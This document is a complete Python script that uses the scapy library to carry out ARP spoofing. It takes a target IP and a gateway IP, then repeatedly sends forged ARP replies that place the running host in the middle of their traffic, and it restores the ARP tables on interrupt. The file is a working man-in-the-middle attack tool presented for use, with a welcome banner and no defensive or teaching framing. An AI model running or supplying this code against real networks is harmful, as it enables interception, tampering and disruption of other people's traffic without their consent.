#!/usr/bin/env python3
# This python program below uses the scapy package to mimic the ARPSPOOF function.
# The host running this program
# There are three functions get_mac_add,arp_spoof,restore_arp_tb which does the basic steps of ARP spoofing.
# This spoofing is kept in loop , till the user breaks out of the program.
# A delay of 2 seconds is set between the spoofing of hosts.

import time
import scapy.all as scapy


# This function returns the MAC Address of the given IP Address.
def get_mac_add(ip_inp):
    output_srp = scapy.srp((scapy.Ether(dst="ff:ff:ff:ff:ff:ff") / scapy.ARP(pdst=ip_inp)), timeout=2)[0]
    return output_srp[0][1].hwsrc


# This function spoofs the running host as host with IP "ip_spoof" to host with IP "ip_trgt"
def arp_spoof(ip_trgt, ip_spoof):
    spoof_packet = scapy.ARP(op=2, pdst=ip_trgt, hwdst=get_mac_add(ip_trgt), psrc=ip_spoof)
    scapy.send(spoof_packet)


# This function restores the ARP Tables of the both the hosts with previous values
def restore_arp_tb(ip_dst, ip_src):
    rst_packet = scapy.ARP(op=2, pdst=ip_dst, hwdst=get_mac_add(ip_dst), psrc=ip_src, hwsrc=get_mac_add(ip_src))
    scapy.send(rst_packet)


print("///// WELCOME TO CUSTOM MADE ARP-SPOOFING /////")
ip_inp_target = input("Enter the Target IP Address ==>  ")
ip_inp_gateway = input("Enter the Gateway IP Address ==> ")
try:
    while True:
        # Spoofing both the hosts.
        arp_spoof(ip_inp_target, ip_inp_gateway)
        arp_spoof(ip_inp_gateway, ip_inp_target)
        time.sleep(2)
except KeyboardInterrupt:
    print("The ARPSPOOF Program has been terminated.. Restoring the ARP tables")
    restore_arp_tb(ip_inp_target, ip_inp_gateway)
    restore_arp_tb(ip_inp_gateway, ip_inp_target)

print(" === Thanks for using the program === ")